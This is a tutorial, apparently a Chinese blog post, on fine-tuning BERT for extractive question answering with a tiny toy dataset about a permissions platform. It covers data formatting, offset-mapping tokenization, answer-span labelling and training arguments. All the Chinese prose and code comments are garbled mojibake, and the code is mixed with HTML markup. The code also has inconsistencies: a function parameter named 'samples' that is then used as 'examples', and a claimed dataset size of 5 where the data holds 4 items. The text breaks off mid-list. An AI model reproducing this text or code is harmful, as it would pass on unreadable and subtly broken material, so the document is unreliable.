<p><code>context</code>å’Œ<code>question</code>å­—æ®µçš„ä½¿ç”¨éå¸¸ç®€å•ç›´æ¥ã€‚<code>answers</code>å­—æ®µç¨æ˜¾å¤æ‚ï¼Œå› ä¸ºå®ƒåŒ…å«ä¸€ä¸ªå¸¦æœ‰ä¸¤ä¸ªå­—æ®µçš„å­—å…¸ï¼Œè€Œè¿™ä¸¤ä¸ªå­—æ®µéƒ½æ˜¯åˆ—è¡¨ã€‚è¿™æ˜¯è¯„ä¼°è¿‡ç¨‹ä¸­<code>squad</code>æŒ‡æ ‡æ‰€æœŸæœ›çš„æ ¼å¼ï¼›å¦‚æœä½ ä½¿ç”¨è‡ªå·±çš„æ•°æ®ï¼Œåˆ™ä¸ä¸€å®šéœ€è¦è´¹å¿ƒå°†ç­”æ¡ˆè®¾ç½®ä¸ºç›¸åŒçš„æ ¼å¼ã€‚<code>text</code>å­—æ®µçš„å«ä¹‰ç›¸å½“æ˜æ˜¾ï¼Œ<code>answer_start</code>å­—æ®µåŒ…å«æ¯ä¸ªç­”æ¡ˆåœ¨ä¸Šä¸‹æ–‡ä¸­çš„èµ·å§‹å­—ç¬¦ç´¢å¼•ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠæˆ‘ä»¬çš„åŸå§‹æ•°æ®ä¹Ÿè½¬æ¢æˆè¿™ç§æ ¼å¼ã€‚å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">defÂ create_toy_qa_dataset()Â -&gt; DatasetDict:  
Â  Â  <span class="hljs-attr">ctx</span> =Â <span class="hljs-string">"""  
Â  Â  æƒé™ç®¡ç†å¹³å° ACC(Auth Config Center)  
Â  Â  ä¸ºä¸­å°æä¾›ä¸€å¥—è¿è¡Œç¨³å®šã€å®‰å…¨å¯é ã€ç•Œé¢ç®€æ´çš„å¯è§†åŒ–æƒé™é…ç½®èƒ½åŠ›ã€‚åŒ…æ‹¬ï¼šæƒé™é…ç½®ã€æƒé™ä¸‹å‘åŠé‰´æƒåŠŸèƒ½ã€‚  
Â  Â  å…¶æ¶‰åŠäº†ä¸€äº›åè¯ï¼š  
Â  Â  - æƒé™ç‚¹(keyword)ï¼šæƒé™ç³»ç»Ÿä¸­æœ€å°çš„æƒé™ç²’åº¦æ˜ å°„åˆ°ä¸šåŠ¡ç³»ç»Ÿå¯¹åº”ç³»ç»Ÿæ“ä½œåŠŸèƒ½ã€‚ä¾‹å¦‚ï¼šæŸ¥è¯¢ï¼Œæœç´¢ï¼Œåˆ é™¤ç­‰æ“ä½œ  
Â  Â  - åŠŸèƒ½æƒé™æ ‘ï¼šä¸ºç”¨æˆ·æä¾›æƒé™ä¸‹å‘ä¸ç³»ç»Ÿæƒé™ç®¡æ§  
Â  Â  - èœå•æƒé™æ ‘ï¼šæä¾›é¡µé¢åŠèœå•çš„æƒé™ä¸‹å‘ä¸ç®¡æ§  
Â  Â  - ç™½åå•ï¼šæ— éœ€ç™»å½•ã€éœ€è¦ç™»å½•æ— éœ€é‰´æƒèµ‹äºˆæŸä¸€ç‰¹å®šè§’è‰²åŠŸèƒ½  
Â  Â  """</span>  
Â  Â Â <span class="hljs-comment"># åŸå§‹æ•°æ®åˆ—è¡¨  </span>
Â  Â  <span class="hljs-attr">raw_data</span> = [  
Â  Â  Â  Â  {  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"id"</span>:Â <span class="hljs-string">"001"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"context"</span>: ctx,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"question"</span>:Â <span class="hljs-string">"ä»€ä¹ˆæ˜¯ ACC"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"answer_text"</span>:Â <span class="hljs-string">"æƒé™ç®¡ç†å¹³å°"</span>,  
Â  Â  Â  Â  },  
Â  Â  Â  Â  {  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"id"</span>:Â <span class="hljs-string">"002"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"context"</span>: ctx,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"question"</span>:Â <span class="hljs-string">"ACC æœ‰å“ªäº›åŠŸèƒ½"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"answer_text"</span>:Â <span class="hljs-string">"æƒé™é…ç½®ã€æƒé™ä¸‹å‘åŠé‰´æƒåŠŸèƒ½"</span>,  
Â  Â  Â  Â  },  
Â  Â  Â  Â  {  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"id"</span>:Â <span class="hljs-string">"003"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"context"</span>: ctx,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"question"</span>:Â <span class="hljs-string">"ACC æœ‰å“ªäº›åè¯"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"answer_text"</span>:Â <span class="hljs-string">"æƒé™ç‚¹"</span>,  
Â  Â  Â  Â  },  
Â  Â  Â  Â  {  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"id"</span>:Â <span class="hljs-string">"004"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"context"</span>: ctx,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"question"</span>:Â <span class="hljs-string">"æƒé™ç‚¹æ˜¯å¹²å˜›çš„"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"answer_text"</span>:Â <span class="hljs-string">"æƒé™ç³»ç»Ÿä¸­æœ€å°çš„æƒé™ç²’åº¦æ˜ å°„åˆ°ä¸šåŠ¡ç³»ç»Ÿå¯¹åº”ç³»ç»Ÿæ“ä½œåŠŸèƒ½"</span>,  
Â  Â  Â  Â  },  
Â  Â  ]  
  
Â  Â Â <span class="hljs-comment"># æ ¼å¼åŒ–æ•°æ®ï¼Œè‡ªåŠ¨è®¡ç®— answer_start  </span>
Â  Â  <span class="hljs-attr">formatted_data</span> = {<span class="hljs-string">"id"</span>: [],Â <span class="hljs-string">"context"</span>: [],Â <span class="hljs-string">"question"</span>: [],Â <span class="hljs-string">"answers"</span>: []}  
  
Â  Â Â forÂ itemÂ inÂ raw_data:  
Â  Â  Â  Â  <span class="hljs-attr">context</span> = item[<span class="hljs-string">"context"</span>]  
Â  Â  Â  Â  <span class="hljs-attr">answer_text</span> = item[<span class="hljs-string">"answer_text"</span>]  
  
Â  Â  Â  Â Â <span class="hljs-comment"># æ‰¾åˆ°ç­”æ¡ˆåœ¨åŸæ–‡ä¸­çš„èµ·å§‹ä½ç½®  </span>
Â  Â  Â  Â  <span class="hljs-attr">start_idx</span> = context.find(answer_text)  
  
Â  Â  Â  Â  formatted_data<span class="hljs-section">["id"]</span>.append(item<span class="hljs-section">["id"]</span>)  
Â  Â  Â  Â  formatted_data<span class="hljs-section">["context"]</span>.append(context)  
Â  Â  Â  Â  formatted_data<span class="hljs-section">["question"]</span>.append(item<span class="hljs-section">["question"]</span>)  
Â  Â  Â  Â  formatted_data<span class="hljs-section">["answers"]</span>.append(  
Â  Â  Â  Â  Â  Â  {"text": <span class="hljs-section">[answer_text]</span>,Â "answer_start": <span class="hljs-section">[start_idx]</span>}  
Â  Â  Â  Â  )  
  
Â  Â Â <span class="hljs-comment"># åˆ›å»º Dataset  </span>
Â  Â  <span class="hljs-attr">ds</span> = Dataset.from_dict(formatted_data)  
Â  Â  <span class="hljs-attr">validation_ds</span> = ds.select(range(<span class="hljs-number">4</span>))  
Â  Â  <span class="hljs-attr">dsd</span> = DatasetDict({<span class="hljs-string">"train"</span>: ds,Â <span class="hljs-string">"validation"</span>: validation_ds})  
  
Â  Â Â returnÂ dsd
</code></pre>
<p>æˆ‘ä»¬è¿™æ¬¡è®­ç»ƒä½¿ç”¨Â <code>google-bert/bert-base-chinese</code>æ¨¡å‹ï¼Œè™½ç„¶å®ƒå¹¶ä¸æ˜¯ä¸“é—¨ç”¨äºé—®ç­”ä»»åŠ¡ã€‚å…ˆå±•ç¤ºä¸€ä¸‹å¾®è°ƒå‰çš„æ•ˆæœï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">model_checkpoint</span> =Â <span class="hljs-string">"google-bert/bert-base-chinese"</span>  
  
<span class="hljs-comment"># åŠ è½½ Tokenizer  </span>
<span class="hljs-attr">tokenizer</span> = AutoTokenizer.from_pretrained(model_checkpoint)  
  
<span class="hljs-comment"># åŠ è½½ Dataset  </span>
<span class="hljs-attr">raw_datasets</span> = create_toy_qa_dataset()  
  
<span class="hljs-attr">model</span> = AutoModelForQuestionAnswering.from_pretrained(model_checkpoint)  
  
<span class="hljs-attr">test_context</span> = raw_datasets[<span class="hljs-string">"train"</span>][<span class="hljs-number">1</span>][<span class="hljs-string">"context"</span>]  
<span class="hljs-attr">test_question</span> = raw_datasets[<span class="hljs-string">"train"</span>][<span class="hljs-number">1</span>][<span class="hljs-string">"question"</span>]  
  
<span class="hljs-attr">answer</span> = get_answer(test_question, test_context, model, tokenizer)  
<span class="hljs-comment"># answer: ''</span>
</code></pre>
<blockquote>
<p>è¿™é‡Œçš„ get_answer çš„å…·ä½“ä»£ç åœ¨ä¸‹æ–‡ä¼šè¯¦ç»†è®²è§£ï¼Œè¿™é‡Œè®¤ä¸ºæ˜¯æ¨¡å‹æ¨ç†å³å¯ã€‚</p>
</blockquote>
<p>è¿™é‡Œå¤§æ¦‚ç‡ä¸º<strong>ç©ºæˆ–ä¹±ç ï¼ˆå› ä¸ºè¯¥æ¨¡å‹æ²¡å­¦è¿‡è¿™ä¸ªä»»åŠ¡ï¼‰</strong> ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å®ƒè¿›è¡Œå¾®è°ƒæ¥è®©æ¨¡å‹èƒ½å¤Ÿæ»¡è¶³æˆ‘ä»¬çš„æ•ˆæœã€‚</p>
<h4 data-id="heading-8">é¢„å¤„ç†æ•°æ®é›†</h4>
<p>æˆ‘ä»¬éœ€è¦å°†æ•°æ®é›†ä¸­çš„æ–‡æœ¬ä¿¡æ¯å¤„ç†æˆ<code>Input IDs</code>ã€‚åˆ©ç”¨Â <code>DatasetDict</code>ä¸­çš„Â <code>map</code>æ–¹æ³•ï¼Œå¯ä»¥å¯¹æ•´ä¸ªæ•°æ®é›†åšæ‰¹å¤„ç†ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">tokenized_datasets</span> = raw_datasets.map(  
Â  Â  Â  Â Â lambdaÂ x: preprocess_function(x, tokenizer),  
Â  Â  Â  Â  <span class="hljs-attr">batched</span>=<span class="hljs-literal">True</span>,Â <span class="hljs-comment"># æ˜¯å¦æ‰¹å¤„ç†  </span>
Â  Â  Â  Â  <span class="hljs-attr">remove_columns</span>=raw_datasets[  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"train"</span>  
Â  Â  Â  Â  ].column_names, Â <span class="hljs-comment"># ç§»é™¤åŸå§‹æ–‡æœ¬åˆ—ï¼Œåªä¿ç•™åˆ†è¯åçš„åˆ— å³ Input ID ç­‰  </span>
Â  Â  )
</code></pre>

<pre><code class="hljs language-ini" lang="ini">defÂ preprocess_function(samples, tokenizer):  
Â  Â  <span class="hljs-attr">tokenized_inputs</span> = tokenizer(  
Â  Â  Â  Â  examples<span class="hljs-section">["question"]</span>,  
Â  Â  Â  Â  examples<span class="hljs-section">["context"]</span>,  
Â  Â  Â  Â  <span class="hljs-attr">max_length</span>=<span class="hljs-number">384</span>,  
Â  Â  Â  Â  <span class="hljs-attr">truncation</span>=<span class="hljs-string">"only_second"</span>,  
Â  Â  Â  Â  <span class="hljs-attr">return_offsets_mapping</span>=<span class="hljs-literal">True</span>,  
Â  Â  Â  Â  <span class="hljs-attr">padding</span>=<span class="hljs-string">"max_length"</span>,  
Â  Â  )  
Â Â <span class="hljs-comment"># ...</span>
</code></pre>
<p>é¦–å…ˆÂ <code>tokenizer</code>ä¸­æˆ‘ä»¬ä¼ å…¥äº†æ¯ä¸€ä¸ªæ ·æœ¬ ï¼ˆæ•°æ®é›†ä¸­çš„æ¯ä¸€æ¡æ•°æ®ï¼‰ çš„Â <code>question</code>å’ŒÂ <code>context</code>ï¼Œè¿™æ ·å°†ä¼šå¯¹åŒæ—¶å¯¹ä¸¤è€…è¿›è¡Œå¤„ç†ã€‚</p>
<ul>
<li><code>max_length</code>ï¼šè¡¨ç¤ºÂ <code>tokenizer</code>å¤„ç†çš„æœ€å¤§é•¿åº¦ï¼Œè¿™é‡Œå‡è®¾ç­”æ¡ˆä¸€å®šåœ¨å‰ 384 ä¸ª Token é‡Œã€‚å¦‚æœæ–‡ç« å¾ˆé•¿ï¼Œè¶…å‡ºéƒ¨åˆ†ç›´æ¥æ‰”æ‰ã€‚</li>
<li><code>truncation="only_second"</code>ï¼šè·Ÿä¸Šè¿°ä¸€æ ·ï¼Œå¦‚æœè¶…é•¿ï¼Œç›´æ¥å¯¹Â <code>context</code>è¿›è¡Œä¸¢å¼ƒã€‚</li>
<li><code>return_offsets_mapping=True</code>: è¿”å›æ¯ä¸ª Token å¯¹åº”åŸæ–‡çš„å­—ç¬¦ä½ç½® (start_char, end_char)</li>
</ul>
<p>æœ€ç»ˆè¾“å…¥çš„Â <code>tokenizied_inputs.input_ids</code>æ˜¯ä¸€ä¸ªÂ <strong>é•¿åº¦ä¸º5</strong>çš„æ•°ç»„ï¼ˆå› ä¸ºæ•°æ®é›†åªæœ‰5æ¡æ•°æ®ï¼Œæ¯ä¸€é¡¹éƒ½åŒ…å« question + contextï¼‰</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡Â <code>tokenized_inputs.sequence_ids(i)</code>å»è·å–å…·ä½“æŸæ¡Â <code>input_id</code>ä¸­ï¼Œå“ªä¸€ä¸ªéƒ¨åˆ†ä»£è¡¨<code>question</code>ã€å“ªä¸€ä¸ªéƒ¨åˆ†ä»£è¡¨<code>context</code>ã€‚</p>
<pre><code class="hljs language-rust" lang="rust">tokenized_inputs.<span class="hljs-title function_ invoke__">sequence_ids</span>(<span class="hljs-number">0</span>)Â   
# [<span class="hljs-literal">None</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, ...]
</code></pre>
<p><code>tokenized_inputs["offset_mapping"]</code>ä¹Ÿæ˜¯ä¸€ä¸ªÂ <strong>é•¿åº¦ä¸º5</strong>çš„æ•°ç»„ï¼Œå®ƒåŒ…å«äº†æ¯ä¸€ä¸ªÂ <code>Token</code>æ‰€åœ¨çš„ç´¢å¼•</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¯¹åº”ç´¢å¼•0  </span>
<span class="hljs-section">[(0,Â 0), (0,Â 1), (1,Â 2), (2,Â 3), (4,Â 7), (0,Â 0), (5,Â 6), (6,Â 7), (7,Â 8), (8,Â 9), (9,Â 10)...]</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>(0, 0)</code>åˆšå¥½å¯¹åº”çš„æ˜¯ Noneï¼Œå…¶å®å°±æ˜¯<code>question</code>å’Œ<code>context</code>ä¹‹é—´çš„ç‰¹æ®Šæ ‡è®°ã€‚</p>
<p>æœ€åæˆ‘ä»¬è¦åšçš„ï¼Œå°±æ˜¯éœ€è¦æ‰¾åˆ°<code>Token</code><strong>çº§åˆ«ä¸‹ï¼Œ</strong> ç­”æ¡ˆæ‰€åœ¨çš„ä½ç½®ï¼š</p>
<ol start="0">
<li>å…ˆæ’é™¤<code>question</code>éƒ¨åˆ†ï¼Œæ‰¾åˆ°<code>context</code>æ‰€åœ¨çš„Â <code>Token</code>ä¸‹çš„ä½ç½®ç´¢å¼•</li>
<li>ä»<code>context</code>çš„é¦–å°¾åŒæ—¶éå†ï¼Œç›´åˆ°æ‰¾åˆ°åŒ…å«Â <code>start_char</code>(åŸå§‹æ•°æ®ä¸­ç­”æ¡ˆæ‰€åœ¨çš„ä½ç½®ç´¢å¼•) çš„Â <code>Token</code></li>
</ol>
<p>è¿™éƒ¨åˆ†ç›¸å¯¹ç®€å•ï¼Œä»£ç å¦‚ä¸‹ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">defÂ preprocess_function(examples, tokenizer):  
Â  Â   
Â  Â  <span class="hljs-attr">tokenized_inputs</span> = tokenizer(  
Â  Â  Â  Â  examples<span class="hljs-section">["question"]</span>,  
Â  Â  Â  Â  examples<span class="hljs-section">["context"]</span>,  
Â  Â  Â  Â  <span class="hljs-attr">max_length</span>=<span class="hljs-number">384</span>,  
Â  Â  Â  Â  <span class="hljs-attr">truncation</span>=<span class="hljs-string">"only_second"</span>,  
Â  Â  Â  Â  <span class="hljs-attr">return_offsets_mapping</span>=<span class="hljs-literal">True</span>,  
Â  Â  Â  Â  <span class="hljs-attr">padding</span>=<span class="hljs-string">"max_length"</span>,  
Â  Â  )  
  
Â  Â Â <span class="hljs-comment"># 2. å¤„ç†ç­”æ¡ˆä½ç½®  </span>
Â  Â  <span class="hljs-attr">offset_mapping</span> = tokenized_inputs.pop(<span class="hljs-string">"offset_mapping"</span>)  
Â  Â  <span class="hljs-attr">answers</span> = examples[<span class="hljs-string">"answers"</span>]  
Â  Â  <span class="hljs-attr">start_positions</span> = []  
Â  Â  <span class="hljs-attr">end_positions</span> = []  
  
Â  Â Â forÂ i, offsetÂ inÂ enumerate(offset_mapping):  
Â  Â  Â  Â  <span class="hljs-attr">answer</span> = answers[i]  
Â  Â  Â  Â  <span class="hljs-attr">start_char</span> = answer[<span class="hljs-string">"answer_start"</span>][<span class="hljs-number">0</span>]  
Â  Â  Â  Â  <span class="hljs-attr">end_char</span> = start_char + len(answer[<span class="hljs-string">"text"</span>][<span class="hljs-number">0</span>])  
  
Â  Â  Â  Â Â <span class="hljs-comment"># sequence_ids ç”¨äºåŒºåˆ†å“ªéƒ¨åˆ†æ˜¯é—®é¢˜ï¼Œå“ªéƒ¨åˆ†æ˜¯ä¸Šä¸‹æ–‡  </span>
Â  Â  Â  Â Â <span class="hljs-comment"># 0 ä»£è¡¨é—®é¢˜ï¼Œ1 ä»£è¡¨ä¸Šä¸‹æ–‡ï¼ŒNone ä»£è¡¨ç‰¹æ®Šç¬¦å·([CLS], [SEP], [PAD])  </span>
Â  Â  Â  Â  <span class="hljs-attr">sequence_ids</span> = tokenized_inputs.sequence_ids(i)  
  
Â  Â  Â  Â Â <span class="hljs-comment"># æ‰¾åˆ°ä¸Šä¸‹æ–‡åœ¨ Token åºåˆ—ä¸­çš„èµ·å§‹å’Œç»“æŸç´¢å¼•  </span>
Â  Â  Â  Â  <span class="hljs-attr">idx</span> =Â <span class="hljs-number">0</span>  
Â  Â  Â  Â Â whileÂ sequence_ids<span class="hljs-section">[idx]</span> !=Â 1:  
Â  Â  Â  Â  Â  Â  idx +=Â 1  
Â  Â  Â  Â  <span class="hljs-attr">context_start</span> = idx  
Â  Â  Â  Â Â whileÂ sequence_ids<span class="hljs-section">[idx]</span> ==Â 1:  
Â  Â  Â  Â  Â  Â  idx +=Â 1  
Â  Â  Â  Â  <span class="hljs-attr">context_end</span> = idx -Â <span class="hljs-number">1</span>  
  
Â  Â  Â  Â Â <span class="hljs-comment"># å¦‚æœç­”æ¡ˆä¸åœ¨å½“å‰æˆªæ–­çš„ç‰‡æ®µä¸­ï¼ˆé’ˆå¯¹è¶…é•¿æ–‡æœ¬ï¼‰ï¼Œè¿™å°±æ ‡è®°ä¸º (0, 0)  </span>
Â  Â  Â  Â Â <span class="hljs-comment"># è¿™é‡Œçš„ offset[context_end][1] æ˜¯å½“å‰ç‰‡æ®µæœ€åä¸€ä¸ª Token å¯¹åº”çš„åŸæ–‡ç»“æŸå­—ç¬¦ä½ç½®  </span>
Â  Â  Â  Â Â ifÂ offset<span class="hljs-section">[context_start]</span><span class="hljs-section">[0]</span> &gt; start_charÂ orÂ offset<span class="hljs-section">[context_end]</span><span class="hljs-section">[1]</span> &lt; end_char:  
Â  Â  Â  Â  Â  Â  start_positions.append(0)  
Â  Â  Â  Â  Â  Â  end_positions.append(0)  
Â  Â  Â  Â Â else:  
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># å¦åˆ™ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ° Token çš„ start_index å’Œ end_index  </span>
  
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># ä»ä¸Šä¸‹æ–‡çš„ç¬¬ä¸€ä¸ª Token å¼€å§‹å¾€åæ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°åŒ…å« start_char çš„ Token  </span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">idx</span> = context_start  
Â  Â  Â  Â  Â  Â Â whileÂ idx &lt;= context_endÂ andÂ offset<span class="hljs-section">[idx]</span><span class="hljs-section">[0]</span> &lt;= start_char:  
Â  Â  Â  Â  Â  Â  Â  Â  idx +=Â 1  
Â  Â  Â  Â  Â  Â  start_positions.append(idx -Â 1)  
  
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># ä»ä¸Šä¸‹æ–‡çš„æœ€åä¸€ä¸ª Token å¼€å§‹å¾€å‰æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°åŒ…å« end_char çš„ Token  </span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">idx</span> = context_end  
Â  Â  Â  Â  Â  Â Â whileÂ idx &gt;= context_startÂ andÂ offset<span class="hljs-section">[idx]</span><span class="hljs-section">[1]</span> &gt;= end_char:  
Â  Â  Â  Â  Â  Â  Â  Â  idx <span class="hljs-attr">-</span>=Â <span class="hljs-number">1</span>  
Â  Â  Â  Â  Â  Â  end_positions.append(idx +Â 1)  
  
Â  Â Â <span class="hljs-comment"># å°†è®¡ç®—å¥½çš„ Token çº§åˆ«çš„èµ·å§‹å’Œç»“æŸä½ç½®æ”¾å…¥ inputs ä¸­  </span>
Â  Â  tokenized_inputs<span class="hljs-section">["start_positions"]</span> = start_positions  
Â  Â  tokenized_inputs<span class="hljs-section">["end_positions"]</span> = end_positions  
  
Â  Â Â returnÂ tokenized_inputs
</code></pre>
<h4 data-id="heading-9">æ„å»ºè¶…å‚æ•°ï¼Œå¼€å§‹è®­ç»ƒ</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">args</span> = TrainingArguments(  
Â  Â  Â  Â  <span class="hljs-attr">output_dir</span>=<span class="hljs-string">"qa-model-finetuned"</span>,  
Â  Â  Â  Â  <span class="hljs-attr">eval_strategy</span>=<span class="hljs-string">"no"</span>, Â <span class="hljs-comment"># æ•°æ®å¤ªå°‘ï¼Œä¸è¿›è¡Œåˆ†æ­¥è¯„ä¼°  </span>
Â  Â  Â  Â  <span class="hljs-attr">save_strategy</span>=<span class="hljs-string">"no"</span>,  
Â  Â  Â  Â  <span class="hljs-attr">learning_rate</span>=<span class="hljs-number">5</span>e-<span class="hljs-number">5</span>,  
Â  Â  Â  Â  <span class="hljs-attr">per_device_train_batch_size</span>=<span class="hljs-number">2</span>, Â <span class="hljs-comment"># å°æ‰¹é‡  </span>
Â  Â  Â  Â  <span class="hljs-attr">per_device_eval_batch_size</span>=<span class="hljs-number">2</span>,  
Â  Â  Â  Â  <span class="hljs-attr">num_train_epochs</span>=<span class="hljs-number">50</span>, Â <span class="hljs-comment"># å¢åŠ  epoch ä»¥ç¡®ä¿æ‹Ÿåˆ  </span>
Â  Â  Â  Â  <span class="hljs-attr">weight_decay</span>=<span class="hljs-number">0.01</span>,  
Â  Â  Â  Â  <span class="hljs-attr">push_to_hub</span>=<span class="hljs-literal">False</span>,  
Â  Â  Â  Â  <span class="hljs-attr">logging_steps</span>=<span class="hljs-number">10</span>,  
Â  Â  Â  Â  <span class="hljs-attr">use_mps_device</span>=<span class="hljs-literal">False</span>,  
Â  Â  )
</code></pre>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹æ¨¡å‹è®­ç»ƒæ—¶çš„ä¸€äº›é‡è¦å‚æ•°ï¼š</p>
<p><strong>num_train_epochs</strong>ï¼šè¦æ‰§è¡Œçš„è®­ç»ƒè½®æ•°æ€»å’Œã€‚é€šä¿—æ¥è¯´ï¼Œ<code>1 Epoch</code>è¡¨ç¤ºæ¨¡å‹å®Œå®Œæ•´æ•´çš„çœ‹è¿‡è¿›è¡Œè®­ç»ƒçš„æ•°æ®é›†ä¸€æ¬¡ã€‚</p>
<ul>
<li>å¦‚æœ<code>num_train_epochs</code>è®¾ç½®è¿‡å¤šï¼Œè®­ç»ƒå‡ºæ¥çš„æ¨¡å‹å°†ä¼šè¿‡æ‹Ÿåˆï¼Œå³ååå¤å¤å¤šæ¬¡èƒŒè¯µè®­ç»ƒçš„æ•°æ®é›†ï¼Œå¯¹æ•°æ®é›†å°±å¾ˆç†Ÿæ‚‰ï¼Œä½†æ˜¯å¦‚æœé‡åˆ°æ–°çš„é—®é¢˜åˆ™å¯èƒ½å›ç­”ä¸å‡ºæ¥ï¼Œæ³›åŒ–èƒ½åŠ›å·®ã€‚åä¹‹ï¼Œåˆ™æ¬ æ‹Ÿåˆã€‚</li>
</ul>
<p><strong>å­¦ä¹ ç‡ learning_rate</strong>: å†³å®šäº†æ¯æ¬¡æ¨¡å‹è®­ç»ƒæ—¶å‚æ•°çš„æ›´æ–°å¹…åº¦ï¼ˆ0-1ï¼‰ã€‚**ç®€å•æ¥è¯´ï¼Œæ¨¡å‹åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­çš„æ•ˆæœä¸å¤Ÿå¥½æ—¶ï¼Œæ¨¡å‹éœ€è¦è°ƒæ•´çš„å¹…åº¦ã€‚</p>
<ul>
<li>å­¦ä¹ ç‡å¤ªå¤§ ï¼ˆæ¯”å¦‚ 0.1ï¼‰ï¼šè€å¸ˆå¤§å¼ä¸€å£°â€œå…¨é”™ï¼é‡å†™ï¼â€ï¼Œå­¦ç”Ÿå“å¾—ä¸çŸ¥æ‰€æªï¼Œå¯èƒ½ä¸‹æ¬¡èµ°å‘å¦ä¸€ä¸ªæç«¯ï¼Œæ°¸è¿œæ‰¾ä¸åˆ°æ­£ç¡®ç­”æ¡ˆï¼ˆæ¨¡å‹ä¸æ”¶æ•›ï¼ŒLoss éœ‡è¡ï¼‰ã€‚</li>
<li>å­¦ä¹ ç‡å¤ªå° ï¼ˆæ¯”å¦‚ 1e-8ï¼‰ï¼šè€å¸ˆæå…¶æ¸©æŸ”åœ°è¯´â€œè¿™é‡Œç¨å¾®æ”¹ä¸€ç‚¹ç‚¹...â€ï¼Œå­¦ç”Ÿæ”¹äº†ä¸€ä¸‡æ¬¡æ‰æ”¹å¯¹ï¼Œç­‰åˆ°æ¯•ä¸šäº†è¿˜æ²¡å­¦ä¼šï¼ˆè®­ç»ƒå¤ªæ…¢ï¼Œæ”¶æ•›ä¸äº†ï¼‰ã€‚</li>
<li>åˆé€‚çš„å€¼ ï¼ˆ5e-5ï¼‰ï¼šè€å¸ˆæŒ‡å‡ºå…³é”®é”™è¯¯ï¼Œè®©å­¦ç”Ÿåšé€‚åº¦çš„è°ƒæ•´ã€‚BERT å¾®è°ƒé€šå¸¸éƒ½ç”¨è¿™ä¸ªé‡çº§ï¼ˆ2e-5 åˆ° 5e-5ï¼‰ï¼Œå› ä¸ºå®ƒå·²ç»â€œé¢„ä¹ â€ï¼ˆé¢„è®­ç»ƒï¼‰è¿‡äº†ï¼Œä¸éœ€è¦ä»å¤´å­¦ï¼Œåªéœ€è¦å¾®è°ƒã€‚</li>
</ul>
<p><strong>æ‰¹é‡å¤§å° per_device_train_batch_sizeï¼šæŒ‡æ¯å°è®¾å¤‡è®­ç»ƒæ—¶çš„æ‰¹é‡å¤§å°ï¼Œåœ¨å¤šGPUæˆ–åˆ†å¸ƒå¼è®­ç»ƒä¸­ï¼Œæ€»</strong>* <em><code>Batch size = per_device_train_batch_size * number_of_devices</code></em>*</p>
<ul>
